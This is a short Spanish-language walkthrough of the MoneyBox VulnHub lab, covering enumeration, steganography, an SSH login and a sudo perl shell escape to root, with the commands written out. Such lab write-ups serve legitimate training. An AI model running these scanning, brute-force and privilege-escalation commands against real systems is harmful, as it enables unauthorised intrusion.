# 💰 MoneyBox – VulnHub Writeup

**Autor:** Pxlymxrph  
**Dificultad:** Fácil  
**Objetivo:** Obtener acceso root y capturar las tres banderas

---

## 🧠 Descripción

MoneyBox es una máquina vulnerable de VulnHub diseñada para practicar técnicas de penetración en entornos Linux. Ideal para preparación practicar técnicas básicas de enumeración y escalada de privilegios.

---

## 🛠️ Herramientas Utilizadas

- **Nmap** – Escaneo de puertos y servicios  
- **Gobuster** – Fuerza bruta de directorios  
- **Steghide** – Extracción de información oculta en imágenes  
- **Hydra** – Fuerza bruta de contraseñas  
- **Netcat** – Shell reversa  
- **GTFOBins** – Escalación de privilegios

---

## 🔍 Pasos para la Explotación

### 1. Descubrimiento de la IP
```bash
sudo arp-scan -I eth0 --localnet --ignoredups
```

### 2. Escaneo de Puertos
```bash
nmap -sCV 192.168.1.78
```

### 3. Fuerza Bruta de Directorios
```bash
gobuster dir -u http://192.168.1.78/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### 4. Análisis de la Página Web
- Accede a `http://192.168.1.78/blogs/`  
- Revisa el código fuente y busca pistas.  
- Descubrirás una clave secreta para usar con Steghide.

### 5. Extracción de Información Oculta
```bash
steghide extract -sf trytofind.jpg
cat data.txt
```

### 6. Acceso SSH
```bash
ssh renu@192.168.1.78
```

### 7. Escalación de Privilegios
```bash
sudo perl -e 'exec "/bin/sh";'
```

### 8. Obtención de la Bandera Root
- Localiza y lee `/root/root.txt`.

---

---

## 🏁 Conclusión

MoneyBox es un excelente laboratorio para principiantes en hacking ético. Te permite practicar **enumeración, explotación y escalación de privilegios** en Linux de manera estructurada y didáctica.
